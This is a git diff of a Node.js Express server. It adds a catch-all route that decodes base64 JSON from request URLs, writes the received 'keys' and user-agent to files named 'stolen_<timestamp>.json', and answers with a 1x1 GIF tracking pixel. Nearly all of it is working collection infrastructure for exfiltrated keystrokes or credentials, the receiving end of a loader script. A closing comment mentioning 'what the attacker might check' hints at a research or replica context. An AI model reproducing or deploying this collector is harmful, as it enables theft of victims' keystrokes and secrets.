@@ -15,11 +15,62 @@ if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });
 app.set('trust proxy', true);
 
 // Serve loader.js
-app.get('/loader.js', (req, res) => {
-    logAccess(req, 'LOADER_REQUEST');
-    res.setHeader('Content-Type', 'application/javascript');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.sendFile(path.join(__dirname, 'loader.js'));
+app.get('*', (req, res) => {
+    const timestamp = new Date().toISOString();
+    const clientIp = req.ip || req.socket.remoteAddress;
+    
+    // Extract base64 from URL path - FIX: decodeURIComponent first
+    const segments = req.path.split('/').filter(Boolean);
+    let encodedData = segments[segments.length - 1] || '';
+    
+    // URL decode in case characters like +, /, = were encoded
+    try {
+        encodedData = decodeURIComponent(encodedData);
+    } catch(e) {
+        // Already decoded or invalid, continue
+    }
+
+    console.log(`[${timestamp}] Request from: ${clientIp}`);
+    console.log(`Path length: ${encodedData.length}`);
+
+    if (encodedData.length > 40) {
+        try {
+            // Fix padding if needed
+            const padding = 4 - (encodedData.length % 4);
+            if (padding !== 4) {
+                encodedData += '='.repeat(padding);
+            }
+            
+            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
+            
+            // Debug: log first 200 chars
+            console.log('Decoded preview:', decodedStr.substring(0, 200));
+            
+            const data = JSON.parse(decodedStr);
+
+            const output = {
+                receivedAt: timestamp,
+                ip: clientIp,
+                userAgent: data.header || req.headers['user-agent'],
+                keysCount: data.keys ? data.keys.length : 0,
+                keys: data.keys || [],
+                rawSize: decodedStr.length
+            };
+
+            const filename = `stolen_${timestamp.replace(/[:.]/g, '-')}.json`;
+            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));
+
+            console.log(`✅ SAVED: ${filename} | Keys: ${output.keysCount}`);
+        } catch (err) {
+            console.error(`❌ Decode error: ${err.message}`);
+            console.error(`Data was: ${encodedData.substring(0, 100)}...`);
+        }
+    }
+
+    // Return 1x1 GIF
+    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    res.setHeader('Content-Type', 'image/gif');
+    res.send(gif);
 });
 
 // Health check (what the attacker might check)
